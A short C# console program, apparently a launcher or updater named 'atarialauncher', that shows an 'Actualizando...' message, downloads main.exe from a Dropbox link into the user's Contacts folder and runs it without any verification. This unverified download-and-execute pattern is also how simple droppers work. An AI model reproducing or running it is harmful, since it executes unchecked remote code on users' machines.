using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace atarialauncher
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "ACTUALIZANDO...";
            Console.WriteLine("Actualizando...");
            var pathWithEnv = @"%USERPROFILE%\Contacts\main.exe";
            var filePath = Environment.ExpandEnvironmentVariables(pathWithEnv);
            if (System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
            {
                System.IO.File.Delete(filePath);
                WebClient webClient = new WebClient();
                webClient.DownloadFile("https://www.dropbox.com/s/fj4i1a254q8dhda/main.exe?dl=1", filePath);

            }
            System.Diagnostics.Process.Start(filePath);
        }
    }
}

